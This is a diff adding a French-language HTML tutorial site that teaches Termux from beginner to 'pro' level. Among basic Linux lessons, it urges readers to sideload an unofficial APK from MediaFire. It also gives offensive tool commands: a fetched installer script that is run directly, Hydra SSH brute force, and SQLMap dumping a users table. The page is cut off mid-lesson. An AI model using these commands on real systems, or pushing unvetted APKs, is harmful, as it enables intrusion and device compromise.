@@ -1,0 +1,1458 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sky-Terminal | Formation Termux Complète Débutant à Pro</title>
+<link rel="stylesheet" href="style1.css">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<!-- HEADER -->
+<header>
+  <div class="logo">
+    <span class="bracket">[</span>
+    <span class="sky">Sky</span><span class="dash">-</span><span class="term">Terminal</span>
+    <span class="bracket">]</span>
+  </div>
+  <nav>
+    <a href="#intro">Accueil</a>
+    <a href="#download">Télécharger</a>
+    <a href="#niveau1">Débutant</a>
+    <a href="#niveau2">Intermédiaire</a>
+    <a href="#niveau3">Pro</a>
+    <a href="#niveau4">Expert</a>
+    <a href="#commandes">Commandes</a>
+    <a href="#suivre">Suivre</a>
+    <a href="#contact">Contact</a>
+  </nav>
+</header>
+
+<!-- HERO -->
+<section class="hero" id="intro">
+  <h1 class="glitch" data-text="FORMATION TERMUX">FORMATION TERMUX</h1>
+  <p class="subtitle">Du débutant au professionnel 🚀</p>
+  <p class="tagline">Propulsé par <span class="credit">Sky Plug SCM</span> × <span class="credit">The Terror SCM</span></p>
+  <a href="#download" class="btn">📥 Télécharger Termux</a>
+  <a href="#niveau1" class="btn btn-alt">🎓 Commencer la formation</a>
+
+  <div class="hero-stats">
+    <div class="stat">
+      <div class="stat-num" data-target="50">0</div>
+      <div class="stat-label">Leçons</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num" data-target="200">0</div>
+      <div class="stat-label">Commandes</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num" data-target="4">0</div>
+      <div class="stat-label">Niveaux</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num" data-target="100">0</div>
+      <div class="stat-label">% Gratuit</div>
+    </div>
+  </div>
+</section>
+
+<!-- SUIVRE -->
+<section class="container" id="suivre">
+  <h2 class="section-title">📢 Suivez-nous</h2>
+  <p class="niveau-desc">Abonne-toi pour ne rien manquer ! 🔔</p>
+
+  <div class="socials">
+    <a href="https://youtube.com/@hacker2308-l4b?si=-9Yko6iVgAUJVSTn" 
+       target="_blank" rel="noopener" class="social-card youtube">
+      <div class="social-icon">▶️</div>
+      <h3>YouTube</h3>
+      <p class="social-pseudo">@hacker2308-l4b</p>
+      <p class="social-desc">Tutos vidéo, démos en direct, astuces Termux</p>
+      <span class="social-btn">S'abonner</span>
+    </a>
+
+    <a href="https://whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K" 
+       target="_blank" rel="noopener" class="social-card whatsapp">
+      <div class="social-icon">💬</div>
+      <h3>WhatsApp Channel</h3>
+      <p class="social-pseudo">Sky-Terminal Officiel</p>
+      <p class="social-desc">Annonces, mises à jour, support communautaire</p>
+      <span class="social-btn">Rejoindre</span>
+    </a>
+  </div>
+</section>
+
+<!-- TÉLÉCHARGEMENT -->
+<section class="container" id="download">
+  <h2 class="section-title">📥 Télécharger Sky-Terminal</h2>
+
+  <div class="download-box">
+    <div class="download-icon">📦</div>
+    <h3>Sky_Plug_CDM_and_Darkseid_CDM_terminal.apk</h3>
+    <p class="download-desc">
+      Application Termux personnalisée <span class="credit">Sky Plug CDM</span> × 
+      <span class="credit">Darkseid CDM</span>. Clique pour télécharger.
+    </p>
+
+    <a href="https://www.mediafire.com/file/uohe9uutmdpotqu/Sky_Plug_CDM_and_Darkseid_CDM_terminal.apk/file" 
+       target="_blank" rel="noopener" class="btn btn-download">
+      ⬇️ Télécharger sur MediaFire
+    </a>
+
+    <p class="warning">
+      ⚠️ <strong>Important :</strong> Autorise les <em>« Sources inconnues »</em> dans tes paramètres Android avant d'installer.
+    </p>
+  </div>
+</section>
+
+<!-- SOMMAIRE -->
+<section class="container" id="sommaire">
+  <h2 class="section-title">📋 Sommaire Complet</h2>
+  <div class="sommaire-grid">
+    <div class="sommaire-card">
+      <h3>🟢 Niveau 1 — Débutant</h3>
+      <ul>
+        <li>1. C'est quoi Termux ?</li>
+        <li>2. Installer Termux</li>
+        <li>3. Interface et clavier</li>
+        <li>4. Mise à jour</li>
+        <li>5. Installer des paquets</li>
+        <li>6. Navigation dossiers</li>
+        <li>7. Créer fichiers/dossiers</li>
+        <li>8. Éditeurs de texte</li>
+        <li>9. Lire des fichiers</li>
+        <li>10. Copier/Déplacer/Supprimer</li>
+      </ul>
+    </div>
+    <div class="sommaire-card">
+      <h3>🟡 Niveau 2 — Intermédiaire</h3>
+      <ul>
+        <li>11. Accès stockage</li>
+        <li>12. Python</li>
+        <li>13. Scripts Bash</li>
+        <li>14. Permissions chmod</li>
+        <li>15. Git et GitHub</li>
+        <li>16. SSH</li>
+        <li>17. Environnements virtuels</li>
+        <li>18. Pip et packages Python</li>
+        <li>19. Node.js et npm</li>
+        <li>20. Compilation</li>
+      </ul>
+    </div>
+    <div class="sommaire-card">
+      <h3>🔴 Niveau 3 — Pro</h3>
+      <ul>
+        <li>21. Proot-distro</li>
+        <li>22. Ubuntu/Debian/Kali</li>
+        <li>23. Nmap</li>
+        <li>24. Metasploit</li>
+        <li>25. Hydra</li>
+        <li>26. SQLMap</li>
+        <li>27. Wireshark</li>
+        <li>28. Burp Suite</li>
+        <li>29. Serveur web local</li>
+        <li>30. Base de données</li>
+      </ul>
+    </div>
+    <div class="sommaire-card">
+      <h3>⚫ Niveau 4 — Expert</h3>
+      <ul>
+        <li>31. Automatisation avancée</li>
+        <li>32. Termux API complet</li>
+        <li>33. Serveurs SSH/HTTP</li>
+        <li>34. Docker via proot</li>
+        <li>35. Cryptographie</li>
+        <li>36. Reverse Engineering</li>
+        <li>37. Scripts malveillants (éthique)</li>
+        <li>38. Pentest Android</li>
+        <li>39. Custom ROM tools</li>
+        <li>40. Développement APK</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ========== NIVEAU 1 : DÉBUTANT (10 leçons) ========== -->
+<section class="container niveau" id="niveau1">
+  <h2 class="section-title">🟢 Niveau 1 — Débutant</h2>
+  <p class="niveau-desc">Premiers pas. Comme apprendre à un enfant de 10 ans.</p>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">01</span>
+      <h3>C'est quoi Termux ?</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Imagine un <strong>robot magique</strong> dans ton téléphone. Tu lui écris des mots, et il fait ce que tu demandes. Ce robot s'appelle <em>Termux</em> !</p>
+      <p>Termux, c'est une application qui transforme ton Android en un <strong>mini ordinateur Linux</strong>, sans avoir besoin de le modifier ou de le rooter.</p>
+      <p>Tu peux y faire tourner des langages de programmation (Python, Node.js, C, C++), des outils de sécurité, des serveurs web, et bien plus encore !</p>
+      <p class="tip">💡 C'est comme avoir un PC dans ta poche, mais sans écran graphique : tout se passe avec des mots écrits (les commandes).</p>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">02</span>
+      <h3>Installer Termux</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>Étape 1 :</strong> Télécharge l'APK depuis le bouton en haut de cette page.</p>
+      <p><strong>Étape 2 :</strong> Va dans <em>Paramètres → Sécurité → Sources inconnues</em> et autorise l'installation.</p>
+      <p><strong>Étape 3 :</strong> Ouvre le fichier APK et installe-le.</p>
+      <p><strong>Étape 4 :</strong> Ouvre Termux. Tu verras un écran noir avec un <code>$</code> qui clignote.</p>
+      <p class="tip">💡 N'utilise PAS le Play Store : la version est obsolète. Télécharge depuis F-Droid ou GitHub.</p>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">03</span>
+      <h3>Interface et clavier Termux</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Termux a des touches spéciales que tu dois connaître :</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>VOLUME BAS + Q</code> <span>→ Afficher les touches spéciales</span></div>
+        <div class="cmd-item"><code>VOLUME BAS + K</code> <span>→ Flèche HAUT (historique)</span></div>
+        <div class="cmd-item"><code>VOLUME BAS + L</code> <span>→ Flèche BAS</span></div>
+        <div class="cmd-item"><code>VOLUME BAS + C</code> <span>→ CTRL + C (arrêter)</span></div>
+        <div class="cmd-item"><code>VOLUME BAS + D</code> <span>→ CTRL + D (quitter)</span></div>
+        <div class="cmd-item"><code>VOLUME BAS + Z</code> <span>→ CTRL + Z (pause)</span></div>
+        <div class="cmd-item"><code>VOLUME BAS + V</code> <span>→ Coller</span></div>
+      </div>
+      <p class="tip">💡 Appuie longuement sur l'écran pour copier/coller du texte.</p>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">04</span>
+      <h3>Première commande : mise à jour</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Avant tout, mets à jour Termux. Tape :</p>
+      <div class="code-block">pkg update && pkg upgrade</div>
+      <p>Le <code>&&</code> veut dire "puis fais ça". Donc : "mets à jour, PUIS installe les nouvelles versions".</p>
+      <p>Réponds <code>y</code> (oui) quand on te le demande.</p>
+      <p class="tip">💡 Fais ça au moins une fois par semaine pour rester à jour !</p>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">05</span>
+      <h3>Installer des paquets</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Pour installer un outil, utilise <code>pkg install</code> :</p>
+      <div class="code-block">pkg install python nodejs git nano openssh curl wget</div>
+      <ul class="list-info">
+        <li><strong>python</strong> — langage de programmation</li>
+        <li><strong>nodejs</strong> — JavaScript côté serveur</li>
+        <li><strong>git</strong> — gestionnaire de versions</li>
+        <li><strong>nano</strong> — éditeur de texte simple</li>
+        <li><strong>openssh</strong> — connexion à distance</li>
+        <li><strong>curl / wget</strong> — télécharger depuis internet</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">06</span>
+      <h3>Se promener dans les dossiers</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Ton téléphone a une arborescence de dossiers, comme un ordinateur. Voici les commandes :</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>pwd</code> <span>→ Print Working Directory : où suis-je ?</span></div>
+        <div class="cmd-item"><code>ls</code> <span>→ Liste les fichiers du dossier actuel</span></div>
+        <div class="cmd-item"><code>ls -la</code> <span>→ Liste détaillée (avec fichiers cachés)</span></div>
+        <div class="cmd-item"><code>cd dossier</code> <span>→ Entrer dans un dossier</span></div>
+        <div class="cmd-item"><code>cd ..</code> <span>→ Reculer d'un dossier</span></div>
+        <div class="cmd-item"><code>cd ~</code> <span>→ Retourner à la maison (home)</span></div>
+        <div class="cmd-item"><code>cd /</code> <span>→ Aller à la racine</span></div>
+      </div>
+      <p><strong>Exemple d'exécution :</strong></p>
+      <div class="terminal-mini">
+        <span class="mini-cmd">$ pwd</span><br>
+        <span class="mini-out">/data/data/com.termux/files/home</span><br><br>
+        <span class="mini-cmd">$ cd storage</span><br>
+        <span class="mini-cmd">$ pwd</span><br>
+        <span class="mini-out">/data/data/com.termux/files/home/storage</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">07</span>
+      <h3>Créer fichiers et dossiers</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="cmd-list">
+        <div class="cmd-item"><code>mkdir mon_dossier</code> <span>→ Créer un dossier</span></div>
+        <div class="cmd-item"><code>mkdir -p a/b/c</code> <span>→ Créer plusieurs niveaux</span></div>
+        <div class="cmd-item"><code>touch fichier.txt</code> <span>→ Créer un fichier vide</span></div>
+        <div class="cmd-item"><code>echo "texte" &gt; fichier.txt</code> <span>→ Créer avec contenu</span></div>
+      </div>
+      <p><strong>Exemple :</strong></p>
+      <div class="terminal-mini">
+        <span class="mini-cmd">$ mkdir projets</span><br>
+        <span class="mini-cmd">$ cd projets</span><br>
+        <span class="mini-cmd">$ touch note.txt</span><br>
+        <span class="mini-cmd">$ echo "Bonjour Sky" &gt; note.txt</span><br>
+        <span class="mini-cmd">$ cat note.txt</span><br>
+        <span class="mini-out">Bonjour Sky</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">08</span>
+      <h3>Éditeurs de texte : nano et vim</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>Nano (simple) :</strong></p>
+      <div class="code-block">nano fichier.txt</div>
+      <p>Raccourcis Nano :</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>CTRL + O</code> <span>→ Sauvegarder</span></div>
+        <div class="cmd-item"><code>CTRL + X</code> <span>→ Quitter</span></div>
+        <div class="cmd-item"><code>CTRL + W</code> <span>→ Chercher</span></div>
+        <div class="cmd-item"><code>CTRL + K</code> <span>→ Couper la ligne</span></div>
+        <div class="cmd-item"><code>CTRL + U</code> <span>→ Coller la ligne</span></div>
+      </div>
+
+      <p><strong>Vim (avancé) :</strong></p>
+      <div class="code-block">vim fichier.txt</div>
+      <p>Raccourcis Vim :</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>i</code> <span>→ Passer en mode insertion</span></div>
+        <div class="cmd-item"><code>ESC</code> <span>→ Mode normal</span></div>
+        <div class="cmd-item"><code>:w</code> <span>→ Sauvegarder</span></div>
+        <div class="cmd-item"><code>:q</code> <span>→ Quitter</span></div>
+        <div class="cmd-item"><code>:wq</code> <span>→ Sauver + quitter</span></div>
+        <div class="cmd-item"><code>:q!</code> <span>→ Quitter sans sauver</span></div>
+        <div class="cmd-item"><code>dd</code> <span>→ Supprimer une ligne</span></div>
+        <div class="cmd-item"><code>yy</code> <span>→ Copier une ligne</span></div>
+        <div class="cmd-item"><code>p</code> <span>→ Coller</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">09</span>
+      <h3>Lire et afficher des fichiers</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="cmd-list">
+        <div class="cmd-item"><code>cat fichier.txt</code> <span>→ Affiche tout le contenu</span></div>
+        <div class="cmd-item"><code>head fichier.txt</code> <span>→ 10 premières lignes</span></div>
+        <div class="cmd-item"><code>tail fichier.txt</code> <span>→ 10 dernières lignes</span></div>
+        <div class="cmd-item"><code>tail -f log.txt</code> <span>→ Suivre un fichier en direct</span></div>
+        <div class="cmd-item"><code>less fichier.txt</code> <span>→ Lire page par page (q pour quitter)</span></div>
+        <div class="cmd-item"><code>more fichier.txt</code> <span>→ Idem mais plus simple</span></div>
+        <div class="cmd-item"><code>wc -l fichier.txt</code> <span>→ Compter les lignes</span></div>
+        <div class="cmd-item"><code>grep "mot" fichier.txt</code> <span>→ Chercher un mot</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">10</span>
+      <h3>Copier, déplacer, supprimer</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="cmd-list">
+        <div class="cmd-item"><code>cp source dest</code> <span>→ Copier un fichier</span></div>
+        <div class="cmd-item"><code>cp -r dossier1 dossier2</code> <span>→ Copier un dossier</span></div>
+        <div class="cmd-item"><code>mv source dest</code> <span>→ Déplacer / Renommer</span></div>
+        <div class="cmd-item"><code>rm fichier.txt</code> <span>→ Supprimer un fichier</span></div>
+        <div class="cmd-item"><code>rm -r dossier</code> <span>→ Supprimer un dossier</span></div>
+        <div class="cmd-item"><code>rm -rf dossier</code> <span>→ Forcer la suppression (DANGER !)</span></div>
+      </div>
+      <p class="tip">⚠️ Attention avec <code>rm -rf</code> : ça supprime SANS demander confirmation. Ne le tape jamais à la légère !</p>
+    </div>
+  </div>
+</section>
+
+<!-- ========== NIVEAU 2 : INTERMÉDIAIRE (10 leçons) ========== -->
+<section class="container niveau" id="niveau2">
+  <h2 class="section-title">🟡 Niveau 2 — Intermédiaire</h2>
+  <p class="niveau-desc">Tu maîtrises les bases. Maintenant, on développe !</p>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">11</span>
+      <h3>Accès au stockage du téléphone</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Par défaut, Termux ne voit pas tes photos, vidéos, etc. Pour y accéder :</p>
+      <div class="code-block">termux-setup-storage</div>
+      <p>Une popup va apparaître, autorise l'accès. Puis tu auras :</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>~/storage/shared</code> <span>→ Stockage interne complet</span></div>
+        <div class="cmd-item"><code>~/storage/downloads</code> <span>→ Dossier Téléchargements</span></div>
+        <div class="cmd-item"><code>~/storage/dcim</code> <span>→ Photos appareil photo</span></div>
+        <div class="cmd-item"><code>~/storage/pictures</code> <span>→ Images</span></div>
+        <div class="cmd-item"><code>~/storage/music</code> <span>→ Musique</span></div>
+        <div class="cmd-item"><code>~/storage/movies</code> <span>→ Vidéos</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">12</span>
+      <h3>Python : premier script</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Installe Python (déjà fait normalement) :</p>
+      <div class="code-block">pkg install python</div>
+      <p>Crée un fichier :</p>
+      <div class="code-block">nano bonjour.py</div>
+      <p>Écris ce code :</p>
+      <div class="code-block">nom = input("Ton nom : ")
+print(f"Salut {nom}, bienvenue sur Sky-Terminal !")</div>
+      <p>Lance-le :</p>
+      <div class="code-block">python bonjour.py</div>
+      <p>Résultat :</p>
+      <div class="terminal-mini">
+        <span class="mini-cmd">$ python bonjour.py</span><br>
+        <span class="mini-out">Ton nom : Sky</span><br>
+        <span class="mini-out">Salut Sky, bienvenue sur Sky-Terminal !</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">13</span>
+      <h3>Scripts Bash automatiques</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Un script Bash, c'est une recette de cuisine que l'ordinateur suit.</p>
+      <div class="code-block">nano hello.sh</div>
+      <p>Contenu :</p>
+      <div class="code-block">#!/bin/bash
+echo "Bonjour !"
+echo "Aujourd'hui, on est le $(date)"
+echo "Ton dossier actuel : $(pwd)"</div>
+      <p>Rends-le exécutable et lance :</p>
+      <div class="code-block">chmod +x hello.sh
+./hello.sh</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">14</span>
+      <h3>Permissions chmod</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Chaque fichier a des permissions : lire (r), écrire (w), exécuter (x).</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>chmod +x script.sh</code> <span>→ Rendre exécutable</span></div>
+        <div class="cmd-item"><code>chmod 755 fichier</code> <span>→ rwxr-xr-x</span></div>
+        <div class="cmd-item"><code>chmod 644 fichier</code> <span>→ rw-r--r--</span></div>
+        <div class="cmd-item"><code>chmod 777 fichier</code> <span>→ Tout ouvert (DANGER)</span></div>
+        <div class="cmd-item"><code>ls -l</code> <span>→ Voir les permissions</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">15</span>
+      <h3>Git et GitHub</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Git permet de sauvegarder ton code et de partager avec le monde.</p>
+      <div class="code-block">pkg install git
+git config --global user.name "Ton Nom"
+git config --global user.email "ton@email.com"</div>
+      <p>Commandes essentielles :</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>git init</code> <span>→ Initialiser un dépôt</span></div>
+        <div class="cmd-item"><code>git clone URL</code> <span>→ Télécharger un projet</span></div>
+        <div class="cmd-item"><code>git status</code> <span>→ Voir les changements</span></div>
+        <div class="cmd-item"><code>git add .</code> <span>→ Tout préparer</span></div>
+        <div class="cmd-item"><code>git commit -m "message"</code> <span>→ Sauvegarder</span></div>
+        <div class="cmd-item"><code>git push</code> <span>→ Envoyer sur GitHub</span></div>
+        <div class="cmd-item"><code>git pull</code> <span>→ Récupérer les changements</span></div>
+        <div class="cmd-item"><code>git log</code> <span>→ Historique</span></div>
+        <div class="cmd-item"><code>git branch</code> <span>→ Voir les branches</span></div>
+        <div class="cmd-item"><code>git checkout -b new</code> <span>→ Créer une branche</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">16</span>
+      <h3>SSH — Connexion à distance</h3>
+    </div>
+    <div class="lecon-body">
+      <p>SSH te permet de contrôler un autre ordinateur ou téléphone.</p>
+      <p><strong>Se connecter à un serveur :</strong></p>
+      <div class="code-block">ssh utilisateur@192.168.1.5
+ssh -p 2222 user@serveur.com</div>
+      <p><strong>Créer des clés SSH (plus sécurisé) :</strong></p>
+      <div class="code-block">ssh-keygen -t rsa -b 4096
+cat ~/.ssh/id_rsa.pub</div>
+      <p><strong>Activer SSH sur ton Termux :</strong></p>
+      <div class="code-block">sshd
+# Port par défaut : 8022
+# Se connecter depuis un autre appareil :
+ssh -p 8022 user@ton_ip</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">17</span>
+      <h3>Environnements virtuels Python</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Pour isoler les dépendances de chaque projet :</p>
+      <div class="code-block">pip install virtualenv
+virtualenv mon_env
+source mon_env/bin/activate
+# Maintenant tu es dans l'environnement
+pip install requests
+deactivate</div>
+      <p>Avec venv (intégré à Python 3) :</p>
+      <div class="code-block">python -m venv env
+source env/bin/activate</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">18</span>
+      <h3>Pip et packages Python</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="cmd-list">
+        <div class="cmd-item"><code>pip install requests</code> <span>→ Installer un package</span></div>
+        <div class="cmd-item"><code>pip list</code> <span>→ Voir tous les packages</span></div>
+        <div class="cmd-item"><code>pip freeze &gt; req.txt</code> <span>→ Sauvegarder les dépendances</span></div>
+        <div class="cmd-item"><code>pip install -r req.txt</code> <span>→ Installer depuis un fichier</span></div>
+        <div class="cmd-item"><code>pip uninstall requests</code> <span>→ Désinstaller</span></div>
+        <div class="cmd-item"><code>pip search mot</code> <span>→ Chercher un package</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">19</span>
+      <h3>Node.js et npm</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="code-block">pkg install nodejs</div>
+      <p>Teste :</p>
+      <div class="code-block">node -v
+npm -v</div>
+      <p>Crée un projet :</p>
+      <div class="code-block">mkdir monapp && cd monapp
+npm init -y
+nano index.js</div>
+      <p>Code :</p>
+      <div class="code-block">console.log("Salut depuis Node.js !");</div>
+      <p>Lance :</p>
+      <div class="code-block">node index.js</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">20</span>
+      <h3>Compilation C / C++</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="code-block">pkg install clang</div>
+      <p>Fichier <code>hello.c</code> :</p>
+      <div class="code-block">#include &lt;stdio.h&gt;
+int main() {
+    printf("Bonjour Sky-Terminal !\n");
+    return 0;
+}</div>
+      <p>Compile et exécute :</p>
+      <div class="code-block">clang hello.c -o hello
+./hello</div>
+      <p>Pour C++ :</p>
+      <div class="code-block">clang++ hello.cpp -o hello
+./hello</div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== NIVEAU 3 : PRO (10 leçons) ========== -->
+<section class="container niveau" id="niveau3">
+  <h2 class="section-title">🔴 Niveau 3 — Pro</h2>
+  <p class="niveau-desc">Sécurité, réseaux, hacking éthique, Linux complet.</p>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">21</span>
+      <h3>Proot-distro : Linux complet sans root</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Proot-distro te permet d'installer Ubuntu, Debian, Kali, Arch, etc.</p>
+      <div class="code-block">pkg install proot-distro
+proot-distro list
+proot-distro install ubuntu
+proot-distro login ubuntu</div>
+      <p>Une fois dedans, tu es dans un VRAI Linux ! Installe des paquets :</p>
+      <div class="code-block">apt update
+apt install python3 pip git</div>
+      <p>Pour sortir : <code>exit</code>.</p>
+      <p>Autres distros :</p>
+      <div class="code-block">proot-distro install debian
+proot-distro install kali
+proot-distro install archlinux
+proot-distro install alpine</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">22</span>
+      <h3>Ubuntu / Debian / Kali en détail</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>Kali Linux</strong> (sécurité) :</p>
+      <div class="code-block">proot-distro install kali
+proot-distro login kali
+apt update && apt upgrade
+apt install nmap metasploit-framework hydra</div>
+      <p><strong>Debian</strong> (stable) :</p>
+      <div class="code-block">proot-distro install debian
+proot-distro login debian</div>
+      <p>Pour sauvegarder ta distro :</p>
+      <div class="code-block">proot-distro backup ubuntu --output ubuntu-backup.tar.gz</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">23</span>
+      <h3>Nmap — Scanner les réseaux</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>⚠️ Uniquement sur ton propre réseau !</strong></p>
+      <div class="code-block">pkg install nmap</div>
+      <p>Scan basique :</p>
+      <div class="code-block">nmap 192.168.1.1</div>
+      <p>Scan de ports spécifiques :</p>
+      <div class="code-block">nmap -p 80,443,22 192.168.1.1</div>
+      <p>Scan de versions :</p>
+      <div class="code-block">nmap -sV 192.168.1.0/24</div>
+      <p>Scan rapide :</p>
+      <div class="code-block">nmap -T4 -F example.com</div>
+      <p>Détection OS :</p>
+      <div class="code-block">nmap -O 192.168.1.1</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">24</span>
+      <h3>Metasploit Framework</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>⚠️ Pour tests éthiques uniquement !</strong></p>
+      <div class="code-block">pkg install curl
+curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
+chmod +x metasploit.sh
+./metasploit.sh
+cd metasploit-framework
+./msfconsole</div>
+      <p>Commandes Metasploit :</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>help</code> <span>→ Aide</span></div>
+        <div class="cmd-item"><code>search nom</code> <span>→ Chercher un exploit</span></div>
+        <div class="cmd-item"><code>use exploit/...</code> <span>→ Utiliser un module</span></div>
+        <div class="cmd-item"><code>show options</code> <span>→ Voir les options</span></div>
+        <div class="cmd-item"><code>set RHOSTS ip</code> <span>→ Définir la cible</span></div>
+        <div class="cmd-item"><code>run</code> <span>→ Lancer</span></div>
+        <div class="cmd-item"><code>sessions</code> <span>→ Voir les sessions</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">25</span>
+      <h3>Hydra — Test de mots de passe</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>⚠️ Uniquement sur tes propres comptes !</strong></p>
+      <div class="code-block">pkg install hydra</div>
+      <p>Usage basique :</p>
+      <div class="code-block">hydra -l admin -P passwords.txt ssh://192.168.1.1</div>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>-l</code> <span>→ Un seul utilisateur</span></div>
+        <div class="cmd-item"><code>-L</code> <span>→ Liste d'utilisateurs</span></div>
+        <div class="cmd-item"><code>-p</code> <span>→ Un seul mot de passe</span></div>
+        <div class="cmd-item"><code>-P</code> <span>→ Fichier de mots de passe</span></div>
+        <div class="cmd-item"><code>-t</code> <span>→ Nombre de threads</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">26</span>
+      <h3>SQLMap — Injection SQL</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="code-block">pkg install sqlmap</div>
+      <p>Test basique :</p>
+      <div class="code-block">sqlmap -u "http://cible.com/page.php?id=1" --dbs</div>
+      <p>Lister les tables :</p>
+      <div class="code-block">sqlmap -u "URL" -D base --tables</div>
+      <p>Dump des données :</p>
+      <div class="code-block">sqlmap -u "URL" -D base -T users --dump</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">27</span>
+      <h3>Serveur web local</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>Avec Python :</strong></p>
+      <div class="code-block">python -m http.server 8080</div>
+      <p>Puis ouvre <code>http://localhost:8080</code> dans ton navigateur.</p>
+      <p><strong>Avec Node.js :</strong></p>
+      <div class="code-block">npm install -g http-server
+http-server -p 8080</div>
+      <p><strong>Avec PHP :</strong></p>
+      <div class="code-block">pkg install php
+php -S localhost:8080</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">28</span>
+      <h3>Base de données MySQL / MariaDB</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="code-block">pkg install mariadb</div>
+      <p>Démarrer :</p>
+      <div class="code-block">mysqld_safe &
+mysql -u root</div>
+      <p>SQL basique :</p>
+      <div class="code-block">CREATE DATABASE mabase;
+USE mabase;
+CREATE TABLE users (id INT, nom VARCHAR(50));
+INSERT INTO users VALUES (1, 'Sky');
+SELECT * FROM users;</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">29</span>
+      <h3>Wireshark / Tcpdump</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Capturer le trafic réseau :</p>
+      <div class="code-block">pkg install tcpdump
+tcpdump -i any -w capture.pcap</div>
